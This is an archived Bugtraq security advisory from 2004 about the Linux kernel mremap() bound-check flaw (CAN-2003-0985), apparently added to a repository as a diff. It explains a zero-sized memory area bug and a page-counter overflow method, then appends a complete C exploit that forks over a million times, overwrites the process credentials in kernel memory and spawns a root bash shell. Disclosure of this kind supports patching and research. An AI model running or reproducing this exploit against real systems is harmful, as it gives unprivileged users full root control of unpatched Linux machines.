@@ -1,0 +1,626 @@
+
+Date: Thu, 15 Jan 2004 16:38:33 +0100 (CET)
+From: Paul Starzetz <ihaquer@...c.pl>
+To: bugtraq@...urityfocus.com
+Subject: Linux kernel mremap() bug update
+
+
+
+Synopsis:    Linux kernel do_mremap local privilege escalation vulnerability
+Product:     Linux kernel
+Version:     2.4 up to 2.4.23 and 2.6.0
+Vendor:      http://www.kernel.org/
+
+URL:         http://isec.pl/vulnerabilities/isec-0013-mremap.txt
+CVE:         http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2003-0985
+Author:      Paul Starzetz <ihaquer@...c.pl>,
+             Wojciech Purczynski <cliph@...c.pl>
+
+Date:        January 5, 2004
+Update:      January 15, 2004
+
+
+Issue:
+======
+
+A critical security vulnerability has been found in the Linux kernel
+memory management code in mremap(2) system call due to incorrect bound
+checks.
+
+
+Vulnerability details:
+======================
+
+The mremap system call provides functionality of resizing (shrinking or
+growing) as well as moving across process's addressable space of existing
+virtual memory areas (VMAs) or any of its parts.
+
+A typical VMA covers at least one memory page (which is exactly 4kB on
+the i386  architecture). An incorrect bound check discovered inside the
+do_mremap() kernel code performing remapping of a virtual memory area
+may lead to creation of a virtual memory area of 0 bytes in length.
+
+The problem bases on the general mremap flaw that remapping of 2 pages
+from inside a VMA creates a memory hole of only one page in length but
+also an additional VMA of two pages. In the case of a zero sized
+remapping request no VMA hole is created but an additional VMA descriptor
+of 0 bytes in length is created.
+
+Such a malicious virtual memory area may disrupt the operation of the other
+parts of the kernel memory management subroutines finally leading to 
+unexpected behavior.
+
+A typical process's memory layout showing invalid VMA created with
+mremap system call:
+
+    08048000-0804c000 r-xp 00000000 03:05 959142     /tmp/test
+    0804c000-0804d000 rw-p 00003000 03:05 959142     /tmp/test
+    0804d000-0804e000 rwxp 00000000 00:00 0
+    40000000-40014000 r-xp 00000000 03:05 1544523    /lib/ld-2.3.2.so
+    40014000-40015000 rw-p 00013000 03:05 1544523    /lib/ld-2.3.2.so
+    40015000-40016000 rw-p 00000000 00:00 0
+    4002c000-40158000 r-xp 00000000 03:05 1544529    /lib/libc.so.6
+    40158000-4015d000 rw-p 0012b000 03:05 1544529    /lib/libc.so.6
+    4015d000-4015f000 rw-p 00000000 00:00 0
+[*] 60000000-60000000 rwxp 00000000 00:00 0
+    bfffe000-c0000000 rwxp fffff000 00:00 0
+
+The broken VMA in the above example has been marked with a [*].
+
+
+Exploitation:
+=============
+
+The iSEC team has identified multiple attack vectors for the bug discovered. 
+In this section we want to describe the page counter method however we strongly
+believe that a much faster and more convenient method exists.
+
+As mentioned above a VMA of 0 bytes in size can be introduced into the process's
+virtual memory list. Its unusual size renders such a VMA partially invisible to 
+the kernel main VM helper routine called find_vma(). The find_vma(ADDR) function
+returns the first VMA descriptor (START, END) from the current process's list
+satysfying ADDR < END or NULL if none. Obviously given a VMA starting and ending
+at the same address ADDR the condition is violated if one searches for ADDR's VMA
+thus the next VMA in the list will be returned.
+
+The mremap() code calls the insert_vm_struct() helper function after creating
+the bogus VMA descriptor in kernel memory which in turn checks the new location
+calling the find_vma() helper which returns the wrong result if a zero sized VMA
+is already present in the new location. Therefore it is possible to introduce 
+multiple bogus VMA descriptors for the same virtual memory address. This happens only
+if the adjacent zero sized VMAs differ in their descriptor flags because otherwise
+they will be linked together in insert_vm_struct(). 
+
+Later the process virtual memory list could look like:
+
+    08048000-080a2000 r-xp 00000000 03:02 53159      /tmp/test
+    080a2000-080a5000 rw-p 00059000 03:02 53159      /tmp/test
+    080a5000-080a6000 rwxp 00000000 00:00 0
+    40000000-40001000 r--p 00000000 00:00 0
+    60000000-60000000 r--p 00000000 00:00 0
+    60000000-60000000 rw-p 00000000 00:00 0
+    60000000-60000000 r--p 00000000 00:00 0
+    60000000-60001000 rwxp 00000000 00:00 0
+    bffff000-c0000000 rwxp 00000000 00:00 0
+
+
+Further we have found that there is an off-by-one increment inside the
+copy_page_range() function for the page counter of the first VMA page directly
+following a zero sized VMA area. This is not a bug in the copy_page_range code(),
+it is just a feature for a combined zero and non-zero VMA. The copy_page_range
+function is called on fork() to copy parent's page tables into the child process.
+
+Moreover we must note that it is possible to remove a zero-sized VMA from the 
+virtual memory list if another suitable VMA is mapped directly below the starting
+address of the 0-VMA. Suitable means that the new VMA must have exactly the same
+attributes (read, exec, etc) as the following zero-sized VMA and do not map a 
+file. This again is a feature of the mmap() system call which will try to 
+minimize the number of used VMA descriptors merging them if possible. Note that
+merging the VMAs doesn't influence any page counters in following VMAs.
+
+Combining the findings above we conclude that it is possible to arbitrarily 
+increment the page counter of the first VMA page by forking more and more a 
+process with a zero-sized VMA 'sandwich'. Cleanup must be done in the child 
+before it can exit() otherwise the kernel would print a nasty error message
+while trying to remove the bogus VMA mappings.
+
+The goal is to overflow the page counter to become 1 again in the child process.
+If the corresponding VMA is unmapped now, the page counter will become 0 and the
+page returned to the kernel memory management. Note that the parent will still 
+hold a reference to the freed page in its page table thus making a manipulation 
+of kernel memory possible.
+
+Let's take a closer look at the incrementing of the page counter. 
+We can introduce M (marked with A's and B's) 0-sized VMAs directly before the
+victim VMA hosting the page we want the counter to overflow. If the victim maps
+anonymous memory, the first write access to the victim VMA page (marked with P)
+will allocate and insert a fresh page frame into the process's page table and
+the page counter will be set to 1:
+
+[A][B][A][B] ... [A][P  VICTIM  ]
+
+After the first fork() P's page counter will become 1 + M + 1 where the first
+one is for the original copy in the parent, M for the bogus VMAs and one for
+the copy in the child. Cleaning up the 0-VMAs in the child will not change the
+page counter however it will be decremented by one on child's exit. Thus after
+the first fork()-exit() pair it will become 1 + M. We can conclude for N forks
+taking integer overflows into account that without the final exit() call in the
+child following equation holds:
+
+1 + M*N + 1 = 1
+
+or that
+
+M*N = 2^32-1 = 3 * 5 * 17 * 257 * 65537
+
+Thus we can for example choose to create (3*5*257) 0-sized VMAs and fork the
+parent (17*65537) times to overflow P's page counter. This may be a quite 
+longish task. Times ranging from about one hour on a fast machine to more than
+10 hours have been observed.
+
+Further exploitation proves to be easy because the kernel page management has 
+the nice property to use a kind of reversed LRU policy for page allocation.
+That means that if a page has been released to the kernel MM subsystem it will 
+be returned on a subsequent allocation request. The released page could be for
+example allocated to a file mapping we can normally only read from or to kernel 
+structures, etc.
+
+It is worth noting that the parent's page reference (PTE) must be unprotected
+before we can use it to modify page contents because fork() will mark it as 
+read only (for copy-on-write reasons).
+
+
+Impact:
+=======
+
+Since no special privileges are required to use the mremap(2) system
+call any process may misuse its unexpected behavior to disrupt the kernel
+memory management subsystem. Proper exploitation of this vulnerability may
+lead to local privilege escalation including execution of  arbitrary  code
+with kernel level access. Proof-of-concept exploit code has been created 
+and successfully tested giving UID 0 shell on vulnerable systems.
+
+All users are encouraged to patch all vulnerable systems as soon as 
+appropriate vendor patches are released.
+
+
+Credits:
+========
+
+Paul Starzetz <ihaquer@...c.pl> has identified the vulnerability and
+performed further research. 
+
+
+Disclaimer:
+===========
+
+This  document and all the information it contains are provided "as is",
+for educational purposes only, without warranty of any kind, whether 
+express or implied.
+
+The  authors reserve the right not to be responsible for the topicality,
+correctness, completeness or quality of the information provided in
+this document. Liability claims regarding damage caused by the use of
+any information provided, including any kind of information which is
+incomplete or incorrect, will therefore be rejected.
+
+
+Appendix:
+=========
+
+/*
+ * Linux kernel mremap() bound checking bug exploit.
+ *
+ * Bug found by Paul Starzetz <paul@...c.pl>
+ *
+ * Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
+ *
+ * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
+ * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
+ * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <syscall.h>
+#include <signal.h>
+#include <time.h>
+#include <sched.h>
+
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+
+#include <asm/page.h>
+
+#define MREMAP_MAYMOVE	1
+#define MREMAP_FIXED	2
+
+#define str(s) 	#s
+#define xstr(s) str(s)
+
+#define DSIGNAL		SIGCHLD
+#define CLONEFL		(DSIGNAL|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_VFORK)
+#define PAGEADDR	0x2000
+
+#define RNDINT		512
+
+#define NUMVMA		(3 * 5 * 257)
+#define NUMFORK		(17 * 65537)
+
+#define DUPTO		1000
+#define TMPLEN		256
+
+#define __NR_sys_mremap	163
+
+_syscall5(ulong, sys_mremap, ulong, a, ulong, b, ulong, c, ulong, d, ulong, e);
+unsigned long sys_mremap(unsigned long addr, unsigned long old_len, unsigned long new_len,
+			 unsigned long flags, unsigned long new_addr);
+
+
+static volatile int pid = 0, ppid, hpid, *victim, *fops, blah = 0, dummy = 0, uid, gid;
+static volatile int *vma_ro, *vma_rw, *tmp;
+static volatile unsigned fake_file[16];
+
+
+void fatal(const char * msg)
+{
+	printf("\n");
+	if (!errno) {
+		fprintf(stderr, "FATAL: %s\n", msg);
+	} else {
+		perror(msg);
+	}
+
+	printf("\nentering endless loop");
+	fflush(stdout);
+	fflush(stderr);
+	while (1) pause();
+}
+
+void kernel_code(void * file, loff_t offset, int origin)
+{
+	int i, c;
+	int *v;
+
+	if (!file)
+		goto out;
+
+	__asm__("movl	%%esp, %0" : : "m" (c));
+
+	c &= 0xffffe000;
+	v = (void *) c;
+
+	for (i = 0; i < PAGE_SIZE / sizeof(*v) - 1; i++) {
+		if (v[i] == uid && v[i+1] == uid) {
+			i++; v[i++] = 0; v[i++] = 0; v[i++] = 0;
+		}
+		if (v[i] == gid) {
+			v[i++] = 0; v[i++] = 0; v[i++] = 0; v[i++] = 0;
+			break;
+		}
+	}
+out:
+	dummy++;
+}
+
+void try_to_exploit(void)
+{
+	int v = 0;
+
+	v += fops[0];
+	v += fake_file[0];
+
+	kernel_code(0, 0, v);
+	lseek(DUPTO, 0, SEEK_SET);
+
+	if (geteuid()) {
+		printf("\nFAILED uid!=0"); fflush(stdout);
+		errno =- ENOSYS;
+		fatal("uid change");
+	}
+
+	printf("\n[+] PID %d GOT UID 0, enjoy!", getpid()); fflush(stdout);
+
+	kill(ppid, SIGUSR1);
+	setresuid(0, 0, 0);
+	sleep(1);
+
+	printf("\n\n"); fflush(stdout);
+
+	execl("/bin/bash", "bash", NULL);
+	fatal("burp");
+}
+
+void cleanup(int v)
+{
+	victim[DUPTO] = victim[0];
+	kill(0, SIGUSR2);
+}
+
+
+void redirect_filp(int v)
+{
+	printf("\n[!] parent check race... "); fflush(stdout);
+
+	if (victim[DUPTO] && victim[0] == victim[DUPTO]) {
+		printf("SUCCESS, cought SLAB page!"); fflush(stdout);
+		victim[DUPTO] = (unsigned) & fake_file;
+		signal(SIGUSR1, &cleanup);
+		kill(pid, SIGUSR1);
+	} else {
+		printf("FAILED!");
+	}
+	fflush(stdout);
+}
+
+int get_slab_objs(void)
+{
+	FILE * fp;
+	int c, d, u = 0, a = 0;
+	static char line[TMPLEN], name[TMPLEN];
+
+	fp = fopen("/proc/slabinfo", "r");
+	if (!fp)
+		fatal("fopen");
+
+	fgets(name, sizeof(name) - 1, fp);
+	do {
+		c = u = a =- 1;
+		if (!fgets(line, sizeof(line) - 1, fp))
+			break;
+		c = sscanf(line, "%s %u %u %u %u %u %u", name, &u, &a, &d, &d, &d, &d);
+	} while (strcmp(name, "size-4096"));
+	
+	fclose(fp);
+
+	return c == 7 ? a - u : -1;
+}
+
+void unprotect(int v)
+{
+	int n, c = 1;
+
+	*victim = 0;
+	printf("\n[+] parent unprotected PTE "); fflush(stdout);
+
+	dup2(0, 2);
+	while (1) {
+		n = get_slab_objs();
+		if (n < 0)
+			fatal("read slabinfo");
+		if (n > 0) {
+			printf("\n    depopulate SLAB #%d", c++);
+			blah = 0; kill(hpid, SIGUSR1);
+			while (!blah) pause();
+		}
+		if (!n) {
+			blah = 0; kill(hpid, SIGUSR1);
+			while (!blah) pause();
+			dup2(0, DUPTO);
+			break;
+		}
+	}
+
+	signal(SIGUSR1, &redirect_filp);
+	kill(pid, SIGUSR1);
+}
+
+void cleanup_vmas(void)
+{
+	int i = NUMVMA;
+
+	while (1) {
+		tmp = mmap((void *) (PAGEADDR - PAGE_SIZE), PAGE_SIZE, PROT_READ,
+				MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
+		if (tmp != (void *) (PAGEADDR - PAGE_SIZE)) {
+			printf("\n[-] ERROR unmapping %d", i); fflush(stdout);
+			fatal("unmap1");
+		}
+		i--;
+		if (!i)
+			break;
+
+		tmp = mmap((void *) (PAGEADDR - PAGE_SIZE), PAGE_SIZE, PROT_READ|PROT_WRITE,
+				MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+		if (tmp != (void *) (PAGEADDR - PAGE_SIZE)) {
+			printf("\n[-] ERROR unmapping %d", i); fflush(stdout);
+			fatal("unmap2");
+		}
+		i--;
+		if (!i)
+			break;
+	}
+}
+
+void catchme(int v)
+{
+	blah++;
+}
+
+void exitme(int v)
+{
+	_exit(0);
+}
+
+void childrip(int v)
+{
+	waitpid(-1, 0, WNOHANG);
+}
+
+void slab_helper(void)
+{
+	signal(SIGUSR1, &catchme);
+	signal(SIGUSR2, &exitme);
+	blah = 0;
+
+	while (1) {
+		while (!blah) pause();
+
+		blah = 0;
+		if (!fork()) {
+			dup2(0, DUPTO);
+			kill(getppid(), SIGUSR1);
+			while (1) pause();
+		} else {
+			while (!blah) pause();
+			blah = 0; kill(ppid, SIGUSR2);
+		}
+	}
+	exit(0);
+}
+
+int main(void)
+{
+	int i, r, v, cnt;
+	time_t start;
+
+	srand(time(NULL) + getpid());
+	ppid = getpid();
+	uid = getuid();
+	gid = getgid();
+
+	hpid = fork();
+	if (!hpid)
+		slab_helper();
+
+	fops = mmap(0, PAGE_SIZE, PROT_EXEC|PROT_READ|PROT_WRITE,
+			MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+	if (fops == MAP_FAILED)
+		fatal("mmap fops VMA");
+	for (i = 0; i < PAGE_SIZE / sizeof(*fops); i++)
+		fops[i] = (unsigned)&kernel_code;
+	for (i = 0; i < sizeof(fake_file) / sizeof(*fake_file); i++)
+		fake_file[i] = (unsigned)fops;
+
+	vma_ro = mmap(0, PAGE_SIZE, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+	if (vma_ro == MAP_FAILED)
+		fatal("mmap1");
+
+	vma_rw = mmap(0, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+	if (vma_rw == MAP_FAILED)
+		fatal("mmap2");
+
+	cnt = NUMVMA;
+	while (1) {
+		r = sys_mremap((ulong)vma_ro, 0, 0, MREMAP_FIXED|MREMAP_MAYMOVE, PAGEADDR);
+		if (r == (-1)) {
+			printf("\n[-] ERROR remapping"); fflush(stdout);
+			fatal("remap1");
+		}
+		cnt--;
+		if (!cnt) break;
+
+		r = sys_mremap((ulong)vma_rw, 0, 0, MREMAP_FIXED|MREMAP_MAYMOVE, PAGEADDR);
+		if (r == (-1)) {
+			printf("\n[-] ERROR remapping"); fflush(stdout);
+			fatal("remap2");
+		}
+		cnt--;
+		if (!cnt) break;
+	}
+
+	victim = mmap((void*)PAGEADDR, PAGE_SIZE, PROT_EXEC|PROT_READ|PROT_WRITE,
+			MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+	if (victim != (void *) PAGEADDR)
+		fatal("mmap victim VMA");
+
+	v = *victim;
+	*victim = v + 1;
+
+	signal(SIGUSR1, &unprotect);
+	signal(SIGUSR2, &catchme);
+	signal(SIGCHLD, &childrip);
+	printf("\n[+] Please wait...HEAVY SYSTEM LOAD!\n"); fflush(stdout);
+	start = time(NULL);
+
+	cnt = NUMFORK;
+	v = 0;
+	while (1) {
+		cnt--;
+		v--;
+		dummy += *victim;
+
+		if (cnt > 1) {
+			__asm__(
+			"pusha				\n"
+			"movl %1, %%eax			\n"
+			"movl $("xstr(CLONEFL)"), %%ebx	\n"
+			"movl %%esp, %%ecx		\n"
+			"movl $120, %%eax		\n"
+			"int  $0x80			\n"
+			"movl %%eax, %0			\n"
+			"popa				\n"
+			: : "m" (pid), "m" (dummy)
+			);
+		} else {
+			pid = fork();
+		}
+
+		if (pid) {
+			if (v <= 0 && cnt > 0) {
+				float eta, tm;
+				v = rand() % RNDINT / 2 + RNDINT / 2;
+				tm = eta = (float)(time(NULL) - start);
+				eta *= (float)NUMFORK;
+				eta /= (float)(NUMFORK - cnt);
+				printf("\r\t%u of %u [ %u %%  ETA %6.1f s ]          ",
+				NUMFORK - cnt, NUMFORK, (100 * (NUMFORK - cnt)) / NUMFORK, eta - tm);
+				fflush(stdout);
+			}
+			if (cnt) {
+				waitpid(pid, 0, 0);
+				continue;
+			}
+			if (!cnt) {
+				while (1) {
+					 r = wait(NULL);
+					 if (r == pid) {
+					 	cleanup_vmas();
+						while (1) { kill(0, SIGUSR2); kill(0, SIGSTOP); pause(); }
+					 }
+				}
+			}
+		}
+
+		else {
+			cleanup_vmas();
+
+			if (cnt > 0) {
+				_exit(0);
+			}
+
+			printf("\n[+] overflow done, the moment of truth..."); fflush(stdout);
+			sleep(1);
+
+			signal(SIGUSR1, &catchme);
+			munmap(0, PAGE_SIZE);
+			dup2(0, 2);
+			blah = 0; kill(ppid, SIGUSR1);
+			while (!blah) pause();
+
+			munmap((void *)victim, PAGE_SIZE);
+			dup2(0, DUPTO);
+
+			blah = 0; kill(ppid, SIGUSR1);
+			while (!blah) pause();
+			try_to_exploit();
+			while (1) pause();
+		}
+	}
+	return 0;
+}
+
+
+-- 
+Paul Starzetz
+iSEC Security Research
+http://isec.pl/
+
+
+
+
